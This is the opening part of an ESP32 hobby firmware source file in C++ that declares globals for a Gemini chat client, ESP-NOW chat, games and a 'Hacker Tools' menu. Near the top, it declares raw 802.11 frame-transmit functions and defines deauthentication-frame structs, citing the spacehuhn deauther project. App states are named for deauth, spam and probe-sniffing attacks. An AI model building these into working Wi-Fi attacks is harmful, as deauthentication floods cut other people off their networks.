#include <Arduino.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>
#include <SPI.h>
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <Preferences.h>
#include <Adafruit_NeoPixel.h>
#include <LittleFS.h>
#include <time.h>
#include <esp_sntp.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <WebServer.h>
#include <Update.h>
#include <ESPmDNS.h>
#include <vector>
#include "secrets.h"

// From https://github.com/spacehuhn/esp8266_deauther/blob/master/esp8266_deauther/functions.h
// extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);
extern "C" int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
extern "C" int esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);


// ============ DEAUTHER PACKET STRUCTURES ============
// MAC header
typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration_id;
  uint8_t addr1[6]; // receiver
  uint8_t addr2[6]; // sender
  uint8_t addr3[6]; // BSSID
  uint16_t seq_ctrl;
} mac_hdr_t;

// Deauthentication frame
typedef struct {
  mac_hdr_t hdr;
  uint16_t reason_code;
} deauth_frame_t;

// ============ TFT PINS & CONFIG ============
#define TFT_CS    10
#define TFT_DC    9
#define TFT_RST   13
#define TFT_MOSI  11
#define TFT_SCLK  12
#define TFT_BL    14
#define TFT_MISO  -1

#define SCREEN_WIDTH  320
#define SCREEN_HEIGHT 170

Adafruit_ST7789 tft = Adafruit_ST7789(TFT_CS, TFT_DC, TFT_RST);
GFXcanvas16 canvas(SCREEN_WIDTH, SCREEN_HEIGHT);

// ============ NEOPIXEL ============
#define NEOPIXEL_PIN 48
#define NEOPIXEL_COUNT 1
Adafruit_NeoPixel pixels(NEOPIXEL_COUNT, NEOPIXEL_PIN, NEO_GRB + NEO_KHZ800);

uint32_t neoPixelColor = 0;
unsigned long neoPixelEffectEnd = 0;

// ============ PERFORMANCE ============
#define CPU_FREQ 240
#define TARGET_FPS 120
#define FRAME_TIME (1000 / TARGET_FPS)

unsigned long lastFrameMillis = 0;
float deltaTime = 0.0;

// ============ COLOR SCHEME (RGB565) - MODERN BLACK & WHITE ============
#define COLOR_BG        0x0000  // Pure Black
#define COLOR_PRIMARY   0xFFFF  // Pure White
#define COLOR_SECONDARY 0xCE79  // Light Gray
#define COLOR_ACCENT    0xFFFF  // White
#define COLOR_TEXT      0xFFFF  // White
#define COLOR_WARN      0xAD55  // Medium Gray
#define COLOR_ERROR     0x7BEF  // Light Red Gray
#define COLOR_DIM       0x7BEF  // Dim Gray
#define COLOR_PANEL     0x18C3  // Very Dark Gray (subtle)
#define COLOR_BORDER    0x39E7  // Border Gray
#define COLOR_SUCCESS   0xE73C  // Light Green Gray

// ============ APP STATE ============
enum AppState {
  STATE_BOOT,
  STATE_MAIN_MENU,
  STATE_WIFI_MENU,
  STATE_WIFI_SCAN,
  STATE_PASSWORD_INPUT,
  STATE_KEYBOARD,
  STATE_CHAT_RESPONSE,
  STATE_LOADING,
  STATE_SYSTEM_MENU,
  STATE_SYSTEM_PERF,
  STATE_TOOL_COURIER,
  STATE_ESPNOW_CHAT,
  STATE_ESPNOW_MENU,
  STATE_ESPNOW_PEER_SCAN,
  STATE_VPET,
  STATE_TOOL_SNIFFER,
  STATE_TOOL_NETSCAN,
  STATE_TOOL_FILE_MANAGER,
  STATE_GAME_HUB,
  STATE_VIS_STARFIELD,
  STATE_VIS_LIFE,
  STATE_VIS_FIRE,
  STATE_GAME_PONG,
  STATE_GAME_SNAKE,
  STATE_GAME_RACING,
  STATE_PIN_LOCK,
  STATE_CHANGE_PIN,
  STATE_RACING_MODE_SELECT,
  STATE_ABOUT,
  STATE_TOOL_WIFI_SONAR,
  // Hacker Tools
  STATE_HACKER_TOOLS_MENU,
  STATE_TOOL_DEAUTH_SELECT,
  STATE_TOOL_DEAUTH_ATTACK,
  STATE_TOOL_SPAMMER,
  STATE_TOOL_PROBE_SNIFFER,
  STATE_TOOL_BLE_MENU,
  STATE_DEAUTH_DETECTOR
};

AppState currentState = STATE_BOOT;
AppState previousState = STATE_BOOT;
AppState transitionTargetState;

// ============ BUTTONS ============
#define BTN_SELECT  0
#define BTN_UP      41
#define BTN_DOWN    40
#define BTN_RIGHT   38
#define BTN_LEFT    39
#define BTN_BACK    42
#define BTN_ACT     LOW
#define TOUCH_LEFT  1
#define TOUCH_RIGHT 2

// ============ API ENDPOINT ============
const char* geminiEndpoint = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-lite:generateContent";

// ============ PREFERENCES & CONFIG ============
Preferences preferences;
#define CONFIG_FILE "/system.aip"

struct SystemConfig {
  String ssid;
  String password;
  String espnowNick;
  bool showFPS;
  float petHunger;
  float petHappiness;
  float petEnergy;
  bool petSleep;
};

SystemConfig sysConfig = {"", "", "ESP32", true, 80.0f, 80.0f, 80.0f, false};

// ============ GLOBAL VARIABLES ============
int screenBrightness = 255;
int cursorX = 0, cursorY = 0;
String userInput = "";
String passwordInput = "";
String selectedSSID = "";
String aiResponse = "";
int scrollOffset = 0;
int menuSelection = 0;
unsigned long lastDebounce = 0;
const unsigned long debounceDelay = 150;

// ============ UI ANIMATION PHYSICS ============
float menuScrollCurrent = 0.0f;
float menuScrollTarget = 0.0f;
// float menuVelocity = 0.0f; // Not used in Lerp

struct Particle {
  float x, y, speed;
  uint8_t size;
};
#define NUM_PARTICLES 30
Particle particles[NUM_PARTICLES];
bool particlesInit = false;

// ============ VISUALS GLOBALS ============
// Starfield
#define NUM_STARS 100
struct Star {
  int x, y, z;
};
Star stars[NUM_STARS];
bool starsInit = false;

// Game of Life
#define LIFE_W 32
#define LIFE_H 17
#define LIFE_SCALE 10
uint8_t lifeGrid[LIFE_W][LIFE_H];
uint8_t nextGrid[LIFE_W][LIFE_H];
bool lifeInit = false;
unsigned long lastLifeUpdate = 0;

// Fire
#define FIRE_W 32
#define FIRE_H 17
uint8_t firePixels[FIRE_W * FIRE_H];
uint16_t firePalette[37];
bool fireInit = false;

// ============ GAME: PONG ============
struct PongBall {
  float x, y;
  float vx, vy;
};

struct PongPaddle {
  float y;
  int score;
};

PongBall pongBall;
PongPaddle player1, player2;
bool pongGameActive = false;

// Pong particles
struct PongParticle {
  float x, y, vx, vy;
  int life;
};
#define MAX_PONG_PARTICLES 20
PongParticle pongParticles[MAX_PONG_PARTICLES];

// ============ GAME: SNAKE ============
#define SNAKE_GRID_WIDTH 32
#define SNAKE_GRID_HEIGHT 17
#define SNAKE_GRID_SIZE 10
struct SnakeSegment {
  int x, y;
};
#define MAX_SNAKE_LENGTH 50
SnakeSegment snakeBody[MAX_SNAKE_LENGTH];
int snakeLength;
SnakeSegment food;
enum SnakeDirection { SNAKE_UP, SNAKE_DOWN, SNAKE_LEFT, SNAKE_RIGHT };
SnakeDirection snakeDir;
bool snakeGameOver;
int snakeScore;
unsigned long lastSnakeUpdate = 0;

// ============ GAME: RACING V2 ============
#define RACE_MODE_SINGLE 0
#define RACE_MODE_MULTI 1
int raceGameMode = RACE_MODE_SINGLE;

struct Car {
  float x;
  float y;
  float z;
  float speed;
  float steerAngle;
  int lap;
};

struct Camera {
  float x;
  float y;
  float z;
};

Car playerCar = {0, 0, 0, 0, 0, 0};
Car aiCar = {0.5, 0, 10, 0, 0, 0};
Car opponentCar = {0, 0, 0, 0, 0, 0};
bool opponentPresent = false;
unsigned long lastOpponentUpdate = 0;

Camera camera = {0, 1500, -5000};

bool racingGameActive = false;
#define MAX_ROAD_POINTS 500
float roadCurvature[MAX_ROAD_POINTS];
float roadHeight[MAX_ROAD_POINTS];
int roadPoints = 0;

unsigned long lastRaceUpdate = 0;

// ESP-NOW Racing Packet
struct RacePacket {
  float x;
  float y;
  float z;
  float speed;
};
RacePacket outgoingRacePacket;
RacePacket incomingRacePacket;


// Racing sprites (16x16)
const unsigned char sprite_car_player[] PROGMEM = {
    0x00, 0x00, 0x07, 0xe0, 0x07, 0xe0, 0x07, 0xe0, 0x0f, 0xf0, 0x3f, 0xfc, 0x7f, 0xfe, 0x7f, 0xfe,
    0xff, 0xff, 0xff, 0xff, 0x7f, 0xfe, 0x7f, 0xfe, 0x3f, 0xfc, 0x0f, 0xf0, 0x07, 0xe0, 0x00, 0x00
};
const unsigned char sprite_car_opponent[] PROGMEM = {
    0x00, 0x00, 0x07, 0xe0, 0x07, 0xe0, 0x07, 0xe0, 0x0f, 0xf0, 0x3f, 0xfc, 0x78, 0x1e, 0x78, 0x1e,
    0xf8, 0x1f, 0xf8, 0x1f, 0x78, 0x1e, 0x78, 0x1e, 0x3f, 0xfc, 0x0f, 0xf0, 0x07, 0xe0, 0x00, 0x00
};
const unsigned char sprite_tree[] PROGMEM = {
    0x01, 0x80, 0x03, 0xc0, 0x07, 0xe0, 0x0f, 0xf0, 0x1f, 0xf8, 0x3f, 0xfc, 0x7f, 0xfe, 0xff, 0xff,
    0x07, 0xe0, 0x07, 0xe0, 0x07, 0xe0, 0x07, 0xe0, 0x07, 0xe0, 0x07, 0xe0, 0x07, 0xe0, 0x07, 0xe0
};

// ============ ICONS (32x32) ============
const unsigned char icon_chat[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x03, 0xFF, 0xFF, 0xC0, 0x0F, 0xFF, 0xFF, 0xF0, 0x1F, 0xFF, 0xFF, 0xF8,
0x3F, 0x00, 0x00, 0xFC, 0x7E, 0x00, 0x00, 0x7E, 0x7C, 0x00, 0x00, 0x3E, 0xF8, 0x0F, 0xF0, 0x1F,
0xF8, 0x3F, 0xFC, 0x1F, 0xF0, 0x3F, 0xFC, 0x0F, 0xF0, 0x00, 0x00, 0x0F, 0xF0, 0x00, 0x00, 0x0F,
0xF0, 0x00, 0x00, 0x0F, 0xF0, 0x3C, 0x3C, 0x0F, 0xF0, 0x3C, 0x3C, 0x0F, 0xF0, 0x00, 0x00, 0x0F,
0xF0, 0x00, 0x00, 0x0F, 0xF0, 0x00, 0x00, 0x0F, 0xF8, 0x00, 0x00, 0x1F, 0x7C, 0x00, 0x00, 0x3E,
0x7E, 0x00, 0x00, 0x7E, 0x3F, 0x00, 0x00, 0xFC, 0x1F, 0xFF, 0xFF, 0xF8, 0x0F, 0xFF, 0xFF, 0xF0,
0x07, 0xFF, 0xFF, 0xE0, 0x03, 0xFF, 0xFF, 0xC0, 0x00, 0x07, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00,
0x00, 0x0C, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char icon_wifi[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0xF0, 0x00, 0x00, 0x7F, 0xFE, 0x00,
0x01, 0xFF, 0xFF, 0x80, 0x07, 0xF0, 0x0F, 0xE0, 0x0F, 0x00, 0x00, 0xF0, 0x1C, 0x00, 0x00, 0x38,
0x38, 0x07, 0xE0, 0x1C, 0x30, 0x3F, 0xFC, 0x0C, 0x00, 0xFC, 0x3F, 0x00, 0x00, 0xE0, 0x07, 0x00,
0x00, 0xC0, 0x03, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00, 0x03, 0xC0, 0x00, 0x00, 0x07, 0xE0, 0x00,
0x00, 0x06, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x00,
0x00, 0x03, 0xC0, 0x00, 0x00, 0x03, 0xC0, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char icon_espnow[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x7E, 0x00, 0x01, 0xFF, 0xFF, 0x80, 0x03, 0xE7, 0xE7, 0xC0,
0x07, 0xC3, 0xC3, 0xE0, 0x0F, 0x81, 0x81, 0xF0, 0x1F, 0x00, 0x00, 0xF8, 0x1E, 0x00, 0x00, 0x78,
0x3C, 0x3C, 0x3C, 0x3C, 0x3C, 0x7E, 0x7E, 0x3C, 0x78, 0xFF, 0xFF, 0x1E, 0x79, 0xFF, 0xFF, 0x9E,
0x7B, 0xFF, 0xFF, 0xDE, 0x7B, 0xDB, 0xDB, 0xDE, 0x7B, 0xC3, 0xC3, 0xDE, 0x78, 0x00, 0x00, 0x1E,
0x3C, 0x00, 0x00, 0x3C, 0x1E, 0x00, 0x00, 0x78, 0x1F, 0x00, 0x00, 0xF8, 0x0F, 0x81, 0x81, 0xF0,
0x07, 0xC3, 0xC3, 0xE0, 0x03, 0xE7, 0xE7, 0xC0, 0x01, 0xFF, 0xFF, 0x80, 0x00, 0x7E, 0x7E, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char icon_courier[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xC0, 0x00, 0x00, 0x07, 0xE0, 0x00,
0x00, 0x0F, 0xF0, 0x00, 0x00, 0x1F, 0xF8, 0x00, 0x0F, 0xFF, 0xFF, 0xF0, 0x1F, 0xFF, 0xFF, 0xF8,
0x1F, 0xFF, 0xFF, 0xF8, 0x1F, 0xC0, 0x03, 0xF8, 0x1F, 0x80, 0x01, 0xF8, 0x1F, 0x00, 0x00, 0xF8,
0x1F, 0x00, 0x00, 0xF8, 0x1F, 0x03, 0xC0, 0xF8, 0x1F, 0x07, 0xE0, 0xF8, 0x1F, 0x0F, 0xF0, 0xF8,
0x1F, 0x1F, 0xF8, 0xF8, 0x1F, 0x1F, 0xF8, 0xF8, 0x1F, 0x0F, 0xF0, 0xF8, 0x1F, 0x07, 0xE0, 0xF8,
0x1F, 0x03, 0xC0, 0xF8, 0x1F, 0x00, 0x00, 0xF8, 0x1F, 0x00, 0x00, 0xF8, 0x0F, 0x00, 0x00, 0xF0,
0x07, 0xFF, 0xFF, 0xE0, 0x03, 0xFF, 0xFF, 0xC0, 0x01, 0xFF, 0xFF, 0x80, 0x00, 0xFF, 0xFF, 0x00,
0x00, 0x3C, 0x3C, 0x00, 0x00, 0x18, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char icon_system[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00, 0x03, 0xC0, 0x00, 0x00, 0x07, 0xE0, 0x00,
0x00, 0x0F, 0xF0, 0x00, 0x00, 0x1F, 0xF8, 0x00, 0x07, 0xFF, 0xFF, 0xE0, 0x0F, 0xFF, 0xFF, 0xF0,
0x1F, 0xFF, 0xFF, 0xF8, 0x3F, 0xF0, 0x0F, 0xFC, 0x3F, 0x80, 0x01, 0xFC, 0x7F, 0x00, 0x00, 0xFE,
0x7E, 0x00, 0x00, 0x7E, 0x7E, 0x3C, 0x3C, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0xFF, 0xFF, 0x7E,
0x7E, 0xFF, 0xFF, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x7E, 0x3C, 0x3C, 0x7E, 0x7E, 0x00, 0x00, 0x7E,
0x7F, 0x00, 0x00, 0xFE, 0x3F, 0x80, 0x01, 0xFC, 0x3F, 0xF0, 0x0F, 0xFC, 0x1F, 0xFF, 0xFF, 0xF8,
0x0F, 0xFF, 0xFF, 0xF0, 0x07, 0xFF, 0xFF, 0xE0, 0x00, 0x1F, 0xF8, 0x00, 0x00, 0x0F, 0xF0, 0x00,
0x00, 0x07, 0xE0, 0x00, 0x00, 0x03, 0xC0, 0x00, 0x00, 0x01, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char icon_pet[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xFC, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x01, 0xFF, 0xFF, 0x80,
0x03, 0xE0, 0x07, 0xC0, 0x07, 0x80, 0x01, 0xE0, 0x0F, 0x00, 0x00, 0xF0, 0x1E, 0x00, 0x00, 0x78,
0x1C, 0x18, 0x18, 0x38, 0x38, 0x3C, 0x3C, 0x1C, 0x38, 0x3C, 0x3C, 0x1C, 0x38, 0x18, 0x18, 0x1C,
0x78, 0x00, 0x00, 0x1E, 0x78, 0x00, 0x00, 0x1E, 0x7C, 0x00, 0x00, 0x3E, 0x7E, 0x00, 0x00, 0x7E,
0x3E, 0x00, 0x00, 0x7C, 0x3F, 0x00, 0x00, 0xFC, 0x1F, 0x83, 0xC1, 0xF8, 0x1F, 0xC7, 0xE3, 0xF8,
0x0F, 0xEF, 0xF7, 0xF0, 0x07, 0xFF, 0xFF, 0xE0, 0x03, 0xFE, 0x7F, 0xC0, 0x01, 0xF8, 0x1F, 0x80,
0x00, 0xE0, 0x07, 0x00, 0x00, 0xC0, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char icon_hacker[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0x7E, 0x00, 0x01, 0xFF, 0xFF, 0x80, 0x03, 0xFF, 0xFF, 0xC0,
0x07, 0xE0, 0x07, 0xE0, 0x0F, 0x80, 0x01, 0xF0, 0x1F, 0x03, 0xC0, 0xF8, 0x1F, 0x07, 0xE0, 0xF8,
0x3E, 0x0F, 0xF0, 0x7C, 0x3C, 0x3F, 0xFC, 0x3C, 0x78, 0x7F, 0xFE, 0x1E, 0x78, 0xFF, 0xFF, 0x1E,
0x78, 0xFF, 0xFF, 0x1E, 0x78, 0x7F, 0xFE, 0x1E, 0x3C, 0x3C, 0x3C, 0x3C, 0x3E, 0x1C, 0x38, 0x7C,
0x1F, 0x00, 0x00, 0xF8, 0x1F, 0x00, 0x00, 0xF8, 0x0F, 0x80, 0x01, 0xF0, 0x07, 0xC0, 0x03, 0xE0,
0x03, 0xFF, 0xFF, 0xC0, 0x01, 0xFF, 0xFF, 0x80, 0x00, 0x7E, 0x7E, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char icon_files[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0xC0, 0x00, 0x00, 0x1F, 0xE0, 0x00,
0x00, 0x38, 0x70, 0x00, 0x00, 0x70, 0x38, 0x00, 0x00, 0xE0, 0x1C, 0x00, 0x01, 0xC0, 0x0E, 0x00,
0x03, 0x80, 0x07, 0x00, 0x07, 0xFF, 0xFF, 0x80, 0x0F, 0xFF, 0xFF, 0xC0, 0x1F, 0xFF, 0xFF, 0xE0,
0x3F, 0x00, 0x00, 0xF0, 0x3E, 0x00, 0x00, 0xF0, 0x7C, 0x00, 0x00, 0xF8, 0x78, 0x00, 0x00, 0x78,
0x78, 0x00, 0x00, 0x78, 0xF0, 0x00, 0x00, 0x3C, 0xF0, 0x00, 0x00, 0x3C, 0xF0, 0x00, 0x00, 0x3C,
0xF0, 0x00, 0x00, 0x3C, 0xF0, 0x00, 0x00, 0x3C, 0x78, 0x00, 0x00, 0x78, 0x7C, 0x00, 0x00, 0xF8,
0x3E, 0x00, 0x00, 0xF0, 0x1F, 0xFF, 0xFF, 0xE0, 0x0F, 0xFF, 0xFF, 0xC0, 0x07, 0xFF, 0xFF, 0x80,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char icon_visuals[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0xF0, 0x00,
0x00, 0x3F, 0xFC, 0x00, 0x00, 0xF0, 0x0F, 0x00, 0x03, 0xC0, 0x03, 0xC0, 0x0F, 0x00, 0x00, 0xF0,
0x1C, 0x07, 0xE0, 0x38, 0x38, 0x1F, 0xF8, 0x1C, 0x70, 0x3E, 0x7C, 0x0E, 0x60, 0x78, 0x1E, 0x06,
0xE0, 0xF0, 0x0F, 0x07, 0xC0, 0xE0, 0x07, 0x03, 0xC1, 0xC0, 0x03, 0x83, 0xC1, 0xC0, 0x03, 0x83,
0xC0, 0xE0, 0x07, 0x03, 0xE0, 0xF0, 0x0F, 0x07, 0x60, 0x78, 0x1E, 0x06, 0x70, 0x3E, 0x7C, 0x0E,
0x38, 0x1F, 0xF8, 0x1C, 0x1C, 0x07, 0xE0, 0x38, 0x0F, 0x00, 0x00, 0xF0, 0x03, 0xC0, 0x03, 0xC0,
0x00, 0xF0, 0x0F, 0x00, 0x00, 0x3F, 0xFC, 0x00, 0x00, 0x0F, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char icon_about[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xC0, 0x00, 0x00, 0x07, 0xE0, 0x00,
0x00, 0x0F, 0xF0, 0x00, 0x00, 0x1F, 0xF8, 0x00, 0x00, 0x1F, 0xF8, 0x00, 0x00, 0x1F, 0xF8, 0x00,
0x00, 0x1F, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3F, 0xFC, 0x00,
0x00, 0x7F, 0xFE, 0x00, 0x00, 0x7F, 0xFE, 0x00, 0x00, 0x7F, 0xFE, 0x00, 0x00, 0x3C, 0x3C, 0x00,
0x00, 0x3C, 0x3C, 0x00, 0x00, 0x3C, 0x3C, 0x00, 0x00, 0x3C, 0x3C, 0x00, 0x00, 0x3C, 0x3C, 0x00,
0x00, 0x3C, 0x3C, 0x00, 0x00, 0x3C, 0x3C, 0x00, 0x00, 0x7F, 0xFE, 0x00, 0x00, 0x7F, 0xFE, 0x00,
0x00, 0x7F, 0xFE, 0x00, 0x00, 0x3F, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char icon_sonar[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0xC0, 0x00, 0x00, 0x1F, 0xF8, 0x00, 0x00, 0x70, 0x0E, 0x00,
0x01, 0xC0, 0x03, 0x80, 0x03, 0x00, 0x00, 0xC0, 0x06, 0x0F, 0xF0, 0x60, 0x0C, 0x38, 0x1C, 0x30,
0x18, 0x60, 0x06, 0x18, 0x30, 0xC0, 0x03, 0x0C, 0x21, 0x87, 0xE1, 0x84, 0x43, 0x0C, 0x30, 0xC2,
0x42, 0x18, 0x18, 0x42, 0x86, 0x30, 0x0C, 0x61, 0x84, 0x20, 0x04, 0x21, 0x8C, 0x41, 0x82, 0x31,
0x88, 0x83, 0xC1, 0x11, 0x88, 0x83, 0xC1, 0x11, 0x8C, 0x41, 0x82, 0x31, 0x84, 0x20, 0x04, 0x21,
0x86, 0x30, 0x0C, 0x61, 0x42, 0x18, 0x18, 0x42, 0x43, 0x0C, 0x30, 0xC2, 0x21, 0x87, 0xE1, 0x84,
0x30, 0xC0, 0x03, 0x0C, 0x18, 0x60, 0x06, 0x18, 0x0C, 0x38, 0x1C, 0x30, 0x06, 0x0F, 0xF0, 0x60,
0x03, 0x00, 0x00, 0xC0, 0x01, 0xC0, 0x03, 0x80, 0x00, 0x70, 0x0E, 0x00, 0x00, 0x1F, 0xF8, 0x00
};

const unsigned char icon_gamehub[] PROGMEM = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xE0, 0x00, 0x00, 0x1F, 0xF8, 0x00,
0x00, 0x7F, 0xFE, 0x00, 0x01, 0xFF, 0xFF, 0x80, 0x03, 0xFF, 0xFF, 0xC0, 0x07, 0xF8, 0x1F, 0xE0,
0x0F, 0x80, 0x01, 0xF0, 0x0F, 0x80, 0x01, 0xF0, 0x0F, 0x86, 0x61, 0xF0, 0x0F, 0x80, 0x01, 0xF0,
0x0F, 0x80, 0x01, 0xF0, 0x0F, 0x80, 0x01, 0xF0, 0x07, 0xF8, 0x1F, 0xE0, 0x03, 0xFF, 0xFF, 0xC0,
0x01, 0xFF, 0xFF, 0x80, 0x00, 0x7F, 0xFE, 0x00, 0x00, 0x1F, 0xF8, 0x00, 0x00, 0x07, 0xE0, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

const unsigned char* menuIcons[] = {icon_chat, icon_wifi, icon_espnow, icon_courier, icon_system, icon_pet, icon_hacker, icon_files, icon_gamehub, icon_about, icon_sonar};

// ============ AI MODE SELECTION ============
enum AIMode { MODE_SUBARU, MODE_STANDARD };
AIMode currentAIMode = MODE_SUBARU;
bool isSelectingMode = false;

// ============ ESP-NOW CHAT SYSTEM ============
#define MAX_ESPNOW_MESSAGES 50
#define MAX_ESPNOW_PEERS 10
#define ESPNOW_MESSAGE_MAX_LEN 200

struct ESPNowMessage {
  char text[ESPNOW_MESSAGE_MAX_LEN];
  uint8_t senderMAC[6];
  unsigned long timestamp;
  bool isFromMe;
};

struct ESPNowPeer {
  uint8_t mac[6];
  String nickname;
  unsigned long lastSeen;
  int rssi;
  bool isActive;
};

ESPNowMessage espnowMessages[MAX_ESPNOW_MESSAGES];
int espnowMessageCount = 0;
int espnowScrollIndex = 0;
bool espnowAutoScroll = true;

ESPNowPeer espnowPeers[MAX_ESPNOW_PEERS];
int espnowPeerCount = 0;
int selectedPeer = 0;

bool espnowInitialized = false;
bool espnowBroadcastMode = true; // true = broadcast, false = unicast to selected peer
String myNickname = "ESP32";

typedef struct struct_message {
  char type; // 'M' = message, 'H' = hello/handshake, 'P' = ping, 'R' = race data
  char nickname[32];
  unsigned long timestamp;
  union {
    char text[ESPNOW_MESSAGE_MAX_LEN];
    RacePacket raceData;
  };
} struct_message;

struct_message outgoingMsg;
struct_message incomingMsg;

// ============ KEYBOARD LAYOUTS ============
const char* keyboardLower[3][10] = {
  {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
  {"a", "s", "d", "f", "g", "h", "j", "k", "l", "<"},
  {"#", "z", "x", "c", "v", "b", "n", "m", " ", "OK"}
};

const char* keyboardUpper[3][10] = {
  {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
  {"A", "S", "D", "F", "G", "H", "J", "K", "L", "<"},
  {"#", "Z", "X", "C", "V", "B", "N", "M", ".", "OK"}
};

const char* keyboardNumbers[3][10] = {
  {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"},
  {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
  {"#", "-", "_", "=", "+", "[", "]", "?", ".", "OK"}
};

const char* keyboardMac[3][10] = {
  {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"},
  {"A", "B", "C", "D", "E", "F", ":", "-", " ", "<"},
  {" ", " ", " ", " ", " ", " ", " ", " ", " ", "OK"}
};

enum KeyboardMode { MODE_LOWER, MODE_UPPER, MODE_NUMBERS };
KeyboardMode currentKeyboardMode = MODE_LOWER;

enum KeyboardContext { CONTEXT_CHAT, CONTEXT_WIFI_PASSWORD, CONTEXT_BLE_NAME, CONTEXT_ESPNOW_CHAT, CONTEXT_ESPNOW_NICKNAME, CONTEXT_ESPNOW_ADD_MAC, CONTEXT_ESPNOW_RENAME_PEER };
KeyboardContext keyboardContext = CONTEXT_CHAT;

// ============ CHAT THEME & ANIMATION ============
int chatTheme = 0; // 0: Modern, 1: Bubble, 2: Cyberpunk
float chatAnimProgress = 1.0f;

// ============ WIFI SCANNER ============
struct WiFiNetwork {
  String ssid;
  int rssi;
  bool encrypted;
  uint8_t bssid[6];
  int channel;
};
WiFiNetwork networks[20];
int networkCount = 0;
int selectedNetwork = 0;
int wifiPage = 0;
const int wifiPerPage = 6;

// ============ SYSTEM VARIABLES ============
int loadingFrame = 0;
unsigned long lastLoadingUpdate = 0;
int selectedAPIKey = 1;

unsigned long perfFrameCount = 0;
unsigned long perfLoopCount = 0;
unsigned long perfLastTime = 0;
